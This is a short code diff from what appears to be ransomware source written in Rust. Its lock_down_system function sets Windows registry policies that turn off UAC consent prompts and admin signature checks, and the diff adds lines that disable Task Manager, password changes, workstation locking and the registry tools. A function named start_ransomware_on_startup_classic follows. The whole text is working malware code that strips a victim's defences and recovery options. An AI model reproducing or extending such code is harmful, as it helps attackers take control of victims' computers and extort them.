@@ -43,6 +43,9 @@ pub fn lock_down_system() {
             key.set_value("ConsentPromptBehaviorAdmin", &0u32);
             key.set_value("ValidateAdminCodeSignatures", &0u32);
             key.set_value("FilterAdministratorToken", &0u32);
+            key.set_value("DisableTaskMgr", &1u32);
+            key.set_value("DisableChangePassword", &1u32);
+            key.set_value("DisableLockWorkstation", &1u32);
         }
         Err(_) => (),
     };
@@ -431,8 +434,12 @@ pub fn lock_down_system() {
     };
 
     let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
-    let (key, disp) = hkcu.create_subkey(&path).unwrap();
-    key.set_value("DisableRegistryTools", &1u32);
+    match hkcu.create_subkey(&path) {
+        Ok((key, disp)) => {
+            key.set_value("DisableRegistryTools", &2u32);
+        }
+        Err(_) => (),
+    };
 }
 
 pub fn start_ransomware_on_startup_classic() {
